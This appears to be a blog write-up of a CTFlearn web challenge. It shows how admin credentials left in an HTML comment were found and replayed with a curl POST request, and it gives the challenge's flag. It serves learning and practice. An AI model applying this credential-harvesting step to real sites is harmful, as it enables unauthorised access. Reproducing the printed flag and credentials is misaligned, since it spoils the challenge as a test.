---
title: "POST Practice"
date: 2026-02-22
categories:
  - Web
tags:
  - Web
  - CTFlearn
collections:
  - CTFlearn
---


{{< admonition tldr "TL;DR" >}}

**POST Practice** is a web challenge from **CTFlearn**. This website requires authentication, via POST. However, it seems as if someone has defaced our site. Maybe there is still some way to authenticate? [Link](http://165.227.106.113/post.php)

{{< /admonition >}}

## Description 

This website requires authentication, via POST. However, it seems as if someone has defaced our site. Maybe there is still some way to authenticate? [Link](http://165.227.106.113/post.php)

---

## Technical Analysis 

When accessing the `post.php` page through the browser, the following message is displayed:

{{< image src="./images/Web.png" >}}

The message indicates that the server is expecting data via the **POST method**, but has not received the required parameters.

By _viewing page source_, an HTML comment was found containing sensitive information:

```html
<h1>This site takes POST data that you have not submitted!</h1>
<!-- username: admin | password: 71urlkufpsdnlkadsf -->
```

This comment reveals valid credentials sent as a **POST parameter**.

---

## Exploit

To send the appropriate POST data, use the `curl` tool via _CLI_ by including the `username` and `password` parameters in the request body:

```bash
curl -X POST http://165.227.106.113/post.php \
  -d "username=admin&password=71urlkufpsdnlkadsf"
```

Output:

```html
<h1>flag{p0st_d4t4_4ll_d4y}</h1>
```

---

## Flags

```flag{p0st_d4t4_4ll_d4y}```
